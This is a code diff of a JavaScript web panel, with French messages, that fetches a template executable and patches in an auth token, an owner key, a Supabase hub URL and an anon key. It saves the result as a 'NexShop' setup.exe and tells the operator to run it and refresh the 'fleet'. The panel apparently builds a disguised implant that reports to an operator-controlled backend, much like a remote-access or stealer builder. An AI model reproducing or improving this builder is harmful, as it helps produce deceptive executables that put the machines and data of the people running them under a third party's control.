@@ -536,63 +536,50 @@ html.no-anim *,html.no-anim *::before,html.no-anim *::after{animation:none !impo
     toast('BUILD STARTED','warn');
     try{
       const tplUrl=window.NEX_TEMPLATE_URL||(location.origin+'/api/template');
-      if(!tplUrl || tplUrl.indexOf('YOUR_')>=0){
-        st.textContent='NEX_TEMPLATE_URL manquant dans config.js';
-        toast('BUILD FAILED','error'); btn.disabled=false; return;
-      }
-      // markers must match template.exe (built with --template)
-      const MK_KEY=new TextEncoder().encode('NEXKEY________________'); // 20 bytes pad style — actual: NEXKEY_ + pad
-      // Use fixed 64-char slots like earlier design
-      function padSlot(s, n){
-        const b=new Uint8Array(n);
-        const e=new TextEncoder().encode(String(s||'').slice(0,n-1));
-        b.set(e); return b;
-      }
-      const r=await fetch(tplUrl,{mode:'cors'});
-      if(!r.ok) throw new Error('template HTTP '+r.status+' — deploy worker.js proxy /api/template');
+      const r=await fetch(tplUrl,{mode:'cors',cache:'no-store'});
+      if(!r.ok) throw new Error('template HTTP '+r.status+' — check /api/template');
       const buf=new Uint8Array(await r.arrayBuffer());
+      const enc=s=>new TextEncoder().encode(s);
+      function pad(s,n){s=String(s||'').slice(0,n); while(s.length<n)s+='X'; return s;}
       function find(hay, needle){
         outer: for(let i=0;i<=hay.length-needle.length;i++){
           for(let j=0;j<needle.length;j++) if(hay[i+j]!==needle[j]) continue outer;
           return i;
-        }
-        return -1;
+        } return -1;
       }
-      const mKey=new TextEncoder().encode('NEXKEY____________________________________________________________');
-      const mHub=new TextEncoder().encode('NEXHUB____________________________________________________________');
-      const mWhu=new TextEncoder().encode('NEXWHU____________________________________________________________');
-      const mWhf=new TextEncoder().encode('NEXWHF_');
-      // if markers not found, still deliver raw template with warning
-      let patched=0;
-      function writeAt(marker, value, size){
-        const i=find(buf, marker);
-        if(i<0) return false;
-        const slot=padSlot(value, size);
-        buf.set(slot, i);
-        return true;
+      function patchOne(marker, value){
+        if(marker.length!==value.length) return 0;
+        const i=find(buf, enc(marker));
+        if(i<0) return 0;
+        buf.set(enc(value), i);
+        return 1;
       }
-      if(writeAt(mKey, KEY, 64)) patched++;
-      if(writeAt(mHub, (window.NEX_SITE_URL||location.origin), 64)) patched++;
-      const whOn=!!(wh && wh.checked);
-      const whU=(whUrl && whUrl.value || '').trim();
-      if(writeAt(mWhu, whU, 64)) patched++;
-      // NEXWHF_ is 7 bytes marker + 1 flag often — skip if absent
-      st.textContent='patched markers='+patched+' · size='+buf.length;
-      if(patched===0){
-        st.textContent+='\\nWARN: aucun marker NEXKEY_/NEXHUB_ dans template — exe livré brut.\\nRebuild template: python tttttt.py --embed --template';
+      // exact markers produced by: python tttttt.py --embed --template
+      const AUTH='NEX_AUTH_TOKEN_XXXXXXXXXXXXXXXXX'; //32
+      const OWNER='NEX_OWNER_KEY_XXXXXXXXXXXXXXXXXX'; //32
+      const HUB='NEX_HUB_URL_'+'X'.repeat(96-'NEX_HUB_URL_'.length); //96
+      const SB='NEX_SBANON_'+'X'.repeat(80-'NEX_SBANON_'.length); //80
+      const sbUrl=(window.NEX_SUPABASE_URL||'').replace(/\/$/,'');
+      const sbAnon=window.NEX_SUPABASE_ANON||'';
+      let n=0;
+      n+=patchOne(AUTH, pad(KEY,32));
+      n+=patchOne(OWNER, pad(KEY,32));
+      n+=patchOne(HUB, pad(sbUrl,96));
+      n+=patchOne(SB, pad(sbAnon,80));
+      st.textContent='markers patched='+n+'/4 · size='+buf.length;
+      if(n===0){
+        st.textContent+='\\n\\nTemplate SANS markers.\\n1) Sur Windows: python tttttt.py --embed --template\\n2) Upload le nouvel template.exe sur GitHub Release\\n3) Rebuild ici';
+        toast('TEMPLATE INVALIDE','error');
+        btn.disabled=false; return;
       }
       const blob=new Blob([buf],{type:'application/octet-stream'});
       const a=document.createElement('a');
       a.href=URL.createObjectURL(blob);
       a.download='NexShop_'+KEY.slice(0,8)+'_setup.exe';
-      a.click();
-      URL.revokeObjectURL(a.href);
-      toast('EXE READY','success');
-      st.textContent+='\\nOK download';
-    }catch(e){
-      st.textContent=String(e);
-      toast('BUILD ERROR','error');
-    }
+      a.click(); URL.revokeObjectURL(a.href);
+      toast('EXE READY '+n+'/4','success');
+      st.textContent+='\\nOK download — lance l\\'exe, puis refresh fleet (Supabase)';
+    }catch(e){ st.textContent=String(e); toast('BUILD ERROR','error'); }
     btn.disabled=false;
   };
 
